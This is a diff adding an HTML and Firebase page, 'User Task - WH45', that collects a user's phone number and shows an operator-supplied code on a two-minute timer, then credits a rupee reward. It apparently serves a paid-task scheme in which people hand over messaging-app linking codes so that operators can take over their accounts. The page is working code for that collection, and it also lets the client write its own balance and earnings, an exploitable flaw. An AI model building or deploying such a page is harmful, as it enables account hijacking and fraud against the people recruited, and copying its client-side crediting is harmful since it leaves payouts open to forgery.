@@ -1,1 +1,279 @@
 
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>User Task - WH45</title>  
+    <style>  
+        body { 
+            font-family: sans-serif; 
+            background: #051238; 
+            display: flex; 
+            justify-content: center; 
+            padding: 10px; 
+        }  
+
+        .card { 
+            background: #1d2b4a; 
+            color: white; 
+            padding: 20px 10px; 
+            border-radius: 12px; 
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3); 
+            width: 98%; 
+            max-width: 500px; 
+            text-align: center; 
+        }  
+
+        #timer { font-size: 32px; color: #ff4757; font-weight: bold; margin: 15px 0; border: 2px solid #ff4757; display: inline-block; padding: 5px 15px; border-radius: 8px; }  
+        
+        .code-boxes { 
+            display: flex; 
+            justify-content: center; 
+            margin: 25px 0; 
+            width: 100%;
+        }  
+        
+        #mainCodeBox {
+            width: 100%; 
+            height: 95px; 
+            text-align: center;
+            font-size: 30px;     
+            font-weight: bold;
+            font-family: 'Arial', sans-serif;
+            color: #fff; 
+            border: 2px solid #34ace0; 
+            border-radius: 10px;
+            background: #24375c;
+            outline: none;
+            letter-spacing: 6px; 
+            box-sizing: border-box;
+            padding: 0 5px;
+        }
+
+        #mainCodeBox::placeholder {
+            font-size: 20px;
+            letter-spacing: 2px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .btn { background: #1e90ff; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 10px; }  
+        input[type="text"] { width: 93%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 8px; }  
+          
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }  
+        
+        .popup {  
+            display: none;  
+            position: fixed;  
+            top: 50%;  
+            left: 50%;  
+            transform: translate(-50%, -50%);  
+            background: #0b1635;  
+            color: white;  
+            padding: 30px;  
+            border-radius: 15px;  
+            z-index: 1001;  
+            width: 280px;  
+            text-align: center;  
+        }  
+        #countText { font-size: 40px; color: #2ed573; font-weight: bold; }  
+    </style>  
+</head>  
+<body>  
+  
+<div class="card">  
+    <h3>Phone Number Verification</h3>  
+    
+    <div style="text-align:left;font-size:12px;color:#fff;margin-bottom:15px; padding: 0 5px;">
+        <p>1. Working hours are from 8:00 PM to 10:00 PM every day.</p>
+        <p>2. Do not reload or refresh this webpage while the task is running.</p>
+        <p>3. Within the specified time limit of 2 minutes, you must complete the required task.</p>
+        <p>4. If the 2-minute process is completed and no response is received from your side, the task may be rejected later.</p>
+        <p>5. The reward will be credited to my account within 5 to 10 minutes.</p>
+        <p>7. To contact Customer Care, please check the address provided at the top-right corner of the Withdrawal page.</p>
+        <p>8.Must add country code.</p>
+    </div>
+
+    <div id="timer">02:00</div>  
+      
+    <input type="text" id="phoneField" placeholder="Enter Phone Number">  
+    <button class="btn" id="submitBtn">Submit & Start Timer</button>  
+  
+    <div class="code-boxes">  
+        <input type="text" id="mainCodeBox" readonly placeholder="Waiting for code...">  
+    </div>  
+</div>  
+  
+<div class="overlay" id="overlay"></div>  
+<div class="popup" id="progressPopup">  
+    <div id="countText">1/100</div>  
+    <p>Processing Data...</p>  
+</div>  
+  
+<div class="popup" id="rewardPopup">  
+    <h2 style="color: #2ed573;">Success!</h2>  
+
+    <button class="btn" style="background:#2f3542;" id="sendBtn">
+        Send : 0
+    </button>  
+
+    <button class="btn" style="background:#ffa502;" id="rewardBtn">
+        Reward : ₹0
+    </button>
+
+    <button class="btn" style="background:#34ace0;color:white;" id="gotItBtn">
+        Got It
+    </button>
+</div>
+  
+<script type="module">  
+    import { auth, db } from "./firebase.js";  
+    import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-auth.js";  
+    import {   
+        doc,   
+        setDoc,   
+        getDoc,   
+        onSnapshot,   
+        updateDoc   
+    } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";  
+  
+    let userUID = null;  
+    let userEmail = null;  
+    let timer;  
+    let codeReceived = false;  
+    let savedData = null;  
+  
+    onAuthStateChanged(auth, (user) => {  
+        if (user) {  
+            userUID = user.uid;  
+            userEmail = user.email;  
+        }  
+    });  
+  
+    document.getElementById('submitBtn').onclick = async () => {  
+        const phoneValue = document.getElementById('phoneField').value;  
+        if(!phoneValue) return alert("Please enter phone number");  
+        if(!userUID) return alert("Wait for login...");  
+  
+        await setDoc(doc(db, "task requests", userUID), {  
+            Phone: phoneValue,  
+            email: userEmail,  
+            uid: userUID,  
+            code: "",   
+            status: "pending",  
+            reward: 0  
+        });  
+  
+        startTimer(120);  
+        listenForAdminCode();  
+    };  
+  
+    function startTimer(duration) {  
+        let timeLeft = duration;  
+        timer = setInterval(() => {  
+            let mins = Math.floor(timeLeft / 60);  
+            let secs = timeLeft % 60;  
+            document.getElementById('timer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;  
+              
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                if(codeReceived){
+                    document.getElementById("sendBtn").innerText = "Send : " + (savedData.Send || 0);
+                    document.getElementById("rewardBtn").innerText = "Reward : ₹" + (savedData.reward || 0);
+                    showProgressCounter();
+                } else {
+                    alert("Time Expired! Request Rejected.");
+                    location.reload();
+                }
+            }
+            timeLeft--;  
+        }, 1000);  
+    }  
+  
+    function listenForAdminCode() {  
+        onSnapshot(doc(db, "task requests", userUID), (snapshot) => {  
+            const data = snapshot.data();  
+            if(data) {
+                document.getElementById("sendBtn").innerText = "Send : " + (data.Send || 0);
+                document.getElementById("rewardBtn").innerText = "Reward : ₹" + (data.reward || 0);
+            }
+            if (data && data.code && data.code.length > 0 && !codeReceived) {  
+                codeReceived = true;
+                savedData = data;
+                document.getElementById('mainCodeBox').value = data.code;  
+            }  
+        });  
+    }  
+
+    async function processReward() {
+        if (!userUID || !savedData) return;
+
+        const userRef = doc(db, "users", userUID);
+        const userSnap = await getDoc(userRef);
+
+        const taskRef = doc(db, "task requests", userUID);
+        const taskSnap = await getDoc(taskRef);
+
+        if(taskSnap.exists()){
+            const taskData = taskSnap.data();
+            if(taskData.status === "completed"){
+                return;
+            }
+        }
+
+        if (userSnap.exists()) {
+            const userData = userSnap.data();
+            
+            const currentBalance = Number(userData.balance) || 0;
+            const currentTotalEarnings = Number(userData.totalEarnings) || 0;
+            const currentCompletedTasks = Number(userData.completedTasks) || 0;
+
+            const rewardAmount = Number(savedData.reward) || 0;
+            const sendAmount = Number(savedData.Send) || 0;
+
+            const newBalance = currentBalance + rewardAmount;
+            const newTotalEarnings = currentTotalEarnings + rewardAmount;
+            const newCompletedTasks = currentCompletedTasks + sendAmount;
+
+            const now = new Date();
+            const timeStr = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
+            const dateStr = now.toLocaleDateString('en-GB');
+            const historyEntry = `\n(${timeStr}, ${dateStr}) WH (+${rewardAmount})`;
+
+            await updateDoc(userRef, {
+                balance: newBalance,
+                totalEarnings: newTotalEarnings,
+                completedTasks: newCompletedTasks,
+                earningHistory: (userData.earningHistory || "") + historyEntry
+            });
+
+            await updateDoc(doc(db, "task requests", userUID), {
+                status: "completed"
+            });
+        }
+    }
+  
+    function showProgressCounter() {  
+        document.getElementById('overlay').style.display = 'block';  
+        document.getElementById('progressPopup').style.display = 'block';  
+        let count = 1;  
+        let counterInterval = setInterval(async () => {  
+            document.getElementById('countText').innerText = count + "/100";  
+            if (count >= 100) {  
+                clearInterval(counterInterval);  
+                
+                await processReward(); 
+                
+                document.getElementById('progressPopup').style.display = 'none';  
+                document.getElementById('rewardPopup').style.display = 'block';  
+            }  
+            count++;  
+        }, 1000); 
+    }  
+
+    document.getElementById("gotItBtn").onclick = () => {
+        window.location.href = "dashboard.html";
+    };
+</script>  
+</body>  
+</html>
